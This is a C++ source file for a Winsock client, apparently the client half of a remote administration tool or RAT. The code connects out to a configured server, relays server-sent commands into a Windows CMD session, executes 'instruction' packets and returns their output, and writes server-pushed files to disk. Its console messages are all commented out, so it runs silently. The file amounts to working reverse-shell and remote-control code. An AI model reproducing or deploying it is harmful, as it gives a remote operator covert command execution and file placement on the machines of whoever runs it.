#include "Client.h"
#include <process.h>


//a lot of the networking structure was adapted from Pindrought's very comprehensive Winsock Networking Tutorials ( http://www.planetchili.net/forum/viewtopic.php?f=3&t=3433 )

Client* Client::clientptr = NULL;
bool Client::connected = false;


bool Client::ProcessPacketType(PacketType _PacketType)
{
	switch (_PacketType)
	{
	case PacketType::Instruction:
	{
		std::string msg;
		if (!GetString(msg))
			return false;
		SendString(General::processCommand(msg), PacketType::Instruction);
		break;
	}

	case PacketType::CMDCommand:
	{
		std::string msg;
		if (!GetString(msg))
			return false;
		if (CMD::cmdptr != NULL)
		{
			CMD::cmdptr->writeCMD(msg);											//MOST ANNOYING BUG: [FIXED]
			break;
		}
		else
		{
			SendString("Initiate a CMD session first.", PacketType::Warning);
			break;
		}
	}

	case PacketType::FileTransferByteBuffer:
	{
		int32_t buffersize; //buffer to hold size of buffer to write to file
		if (!Getint32_t(buffersize)) //get size of buffer as integer
			return false;
		if (!recvall(file.buffer, buffersize)) //get buffer and store it in file.buffer
		{
			return false;
		}
		file.outfileStream.write(file.buffer, buffersize); //write buffer from file.buffer to our outfilestream
		file.bytesWritten += buffersize; //increment byteswritten
										 //std::cout << "Received byte buffer for file transfer of size: " << buffersize << std::endl;
		if (!SendPacketType(PacketType::FileTransferRequestNextBuffer)) //send PacketType type to request next byte buffer (if one exists)
			return false;
		break;
	}
	case PacketType::FileTransfer_EndOfFile:
	{
		//std::cout << "File transfer completed. File received." << std::endl;
		//std::cout << "File Name: " << file.fileName << std::endl;
		//std::cout << "File Size(bytes): " << file.bytesWritten << std::endl;
		file.bytesWritten = 0;
		file.outfileStream.close(); //close file after we are done writing file
		break;
	}
	default: //If PacketType type is not accounted for
			 //std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
		break;
	}
	return true;
}

void Client::ClientThread()
{
	PacketType PacketType;
	while (true)
	{
		if (!clientptr->GetPacketType(PacketType)) //Get PacketType type
			break; //If there is an issue getting the PacketType type, exit this loop
		if (!clientptr->ProcessPacketType(PacketType)) //Process PacketType (PacketType type)
			break; //If there is an issue processing the PacketType, exit this loop
	}
	connected = false;
	//std::cout << "Lost connection to the server." << std::endl;
	if (clientptr->CloseConnection()) //Try to close socket connection..., If connection socket was closed properly
	{
		//std::cout << "Socket to the server was closed successfuly." << std::endl;
	}
	else //If connection socket was not closed properly for some reason from our function
	{
		//std::cout << "Socket was not able to be closed." << std::endl;
	}
}

bool Client::resolveIP(std::string &hostname)
{
	int sockfd;
	struct addrinfo hints, *servinfo, *p;
	struct sockaddr_in *h;
	int rv;
	char ip[INET6_ADDRSTRLEN];

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC; // use AF_INET6 to force IPv6
	hints.ai_socktype = SOCK_STREAM;

	if ((rv = getaddrinfo(hostname.c_str(), "http", &hints, &servinfo)) != 0)
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		return false;
	}

	// loop through all the results and connect to the first we can
	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		h = (struct sockaddr_in *) p->ai_addr;
		strcpy_s(ip, INET6_ADDRSTRLEN, inet_ntoa(h->sin_addr));
	}

	freeaddrinfo(servinfo); // all done with this structure
	hostname = ip;
	return true;
}

bool Client::RequestFile(std::string FileName)
{
	file.outfileStream.open(FileName, std::ios::binary); //open file to write file to
	file.fileName = FileName; //save file name
	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
	if (!file.outfileStream.is_open()) //if file failed to open...
	{
		//std::cout << "ERROR: Function(Client::RequestFile) - Unable to open file: " << FileName << " for writing.\n";
		return false;
	}
	//std::cout << "Requesting file from server: " << FileName << std::endl;
	if (!SendString(FileName, PacketType::FileTransferRequestFile)) //send file name
		return false;
	return true;
}

Client::Client(std::string IP, int PORT)
{
	//Winsock Startup
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0)
	{
		exit(0);
	}
	resolveIP(IP);
	addr.sin_addr.s_addr = inet_addr(IP.c_str()); //Address (127.0.0.1) = localhost (this pc)
	addr.sin_port = htons(PORT); //Port 
	addr.sin_family = AF_INET; //IPv4 Socket
	clientptr = this; //Update ptr to the client which will be used by our client thread
}

bool Client::Connect()
{
	Connection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
	if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) //If we are unable to connect...
	{
		return false;
	}

	//std::cout << "Connected!" << std::endl;
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientThread, NULL, NULL, NULL); //Create the client thread that will receive any data that the server sends.
	connected = true;
	return true;
}

bool Client::CloseConnection()
{
	if (closesocket(Connection) == SOCKET_ERROR)
	{
		if (WSAGetLastError() == WSAENOTSOCK) //If socket error is that operation is not performed on a socket (This happens when the socket has already been closed)
			return true; //return true since connection has already been closed

		std::string ErrorMessage = "Failed to close the socket. Winsock Error: " + std::to_string(WSAGetLastError()) + ".";
		//TODO: HANDLE ERROR
		return false;
	}
	return true;
}